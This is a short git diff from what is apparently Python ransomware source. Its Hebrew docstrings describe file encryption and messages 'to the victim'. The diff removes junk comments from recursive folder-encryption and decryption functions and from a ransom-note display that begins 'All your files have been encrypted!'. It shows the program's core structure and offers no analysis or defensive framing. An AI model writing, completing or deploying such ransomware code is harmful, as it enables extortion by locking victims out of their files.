@@ -28,7 +28,7 @@ class FileEncryptor:
     """אחראי על הצפנה ופענוח של קבצים"""
 
     @staticmethod
-    def encrypt_folder(folder_path, aes_key):  #asdasdasdsasad
+    def encrypt_folder(folder_path, aes_key):
         for file_name in os.listdir(folder_path):
             full_path = os.path.join(folder_path, file_name)
             if os.path.isfile(full_path):
@@ -50,7 +50,7 @@ class FileEncryptor:
                 FileEncryptor.encrypt_folder(full_path, aes_key)
 
     @staticmethod
-    def decrypt_folder(folder_path, aes_key): #213213213swdasdas
+    def decrypt_folder(folder_path, aes_key):
         for file_name in os.listdir(folder_path):
             full_path = os.path.join(folder_path, file_name)
             if os.path.isfile(full_path):
@@ -78,7 +78,7 @@ class RansomNote:
     """אחראי על הצגת הודעות לקורבן"""
 
     @staticmethod
-    def display_encryption_note(): #sadjasfgahsjsag
+    def display_encryption_note():
         note = """
         🔒 All your files have been encrypted!
         
